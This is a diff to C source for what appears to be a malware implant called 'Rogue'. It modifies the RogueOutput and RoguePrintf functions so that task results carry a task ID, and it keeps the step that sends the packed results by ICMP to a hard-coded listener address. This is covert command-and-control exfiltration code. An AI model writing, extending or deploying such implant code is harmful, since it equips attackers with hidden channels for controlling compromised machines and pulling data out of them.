@@ -33,7 +33,7 @@ typedef struct
  * logs, it will print the data out.
  *
 !*/
-D_SEC( B ) VOID RogueOutput( _In_ PROGUE_CTX Context, _In_ PCHAR Buffer, _In_ UINT32 Length )
+D_SEC( B ) VOID RogueOutput( _In_ PROGUE_CTX Context, _In_ USHORT Uid, _In_ PCHAR Buffer, _In_ UINT32 Length )
 {
 	API		Api;
 
@@ -53,9 +53,8 @@ D_SEC( B ) VOID RogueOutput( _In_ PROGUE_CTX Context, _In_ PCHAR Buffer, _In_ UI
 			if ( BufferExtend( Buf, sizeof( TASK_RET_HDR ) ) ) {
 				if ( BufferAddRaw( Buf, Buffer, Length ) ) {
 					Ret = C_PTR( U_PTR( Buf->Buffer ) + sizeof( Context->Id ) );
-					Ret->TaskId = 0;
-					Ret->CallbackId = PrintOutputAction;
-					Ret->ReturnCode = 0; // change me!
+					Ret->TaskId = Uid;
+					Ret->ReturnCode = PrintOutputAction;
 					Ret->ErrorValue = 0;
 
 					IcmpSend( C_PTR( G_PTR( ICMP_LISTENER_ADDRESS ) ), Context, Buf->Buffer, Buf->Length );
@@ -80,7 +79,7 @@ D_SEC( B ) VOID RogueOutput( _In_ PROGUE_CTX Context, _In_ PCHAR Buffer, _In_ UI
  * logs, it will print the data out.
  *
 !*/
-D_SEC( B ) VOID RoguePrintf( _In_ PROGUE_CTX Context, _In_ PCHAR Format, ... ) 
+D_SEC( B ) VOID RoguePrintf( _In_ PROGUE_CTX Context, _In_ USHORT Uid, _In_ PCHAR Format, ... ) 
 {
 	API		Api;
 	va_list		Lst;
@@ -108,9 +107,8 @@ D_SEC( B ) VOID RoguePrintf( _In_ PROGUE_CTX Context, _In_ PCHAR Format, ... )
 
 				if ( BufferExtend( Buf, Len ) ) {
 					Ret = C_PTR( U_PTR( Buf->Buffer ) + sizeof( Context->Id ) );
-					Ret->TaskId = 0;
-					Ret->CallbackId = PrintOutputAction;
-					Ret->ReturnCode = 0; // change me!
+					Ret->TaskId = Uid;
+					Ret->ReturnCode = PrintOutputAction; // change me!
 					Ret->ErrorValue = 0;
 
 					va_start( Lst, Format );
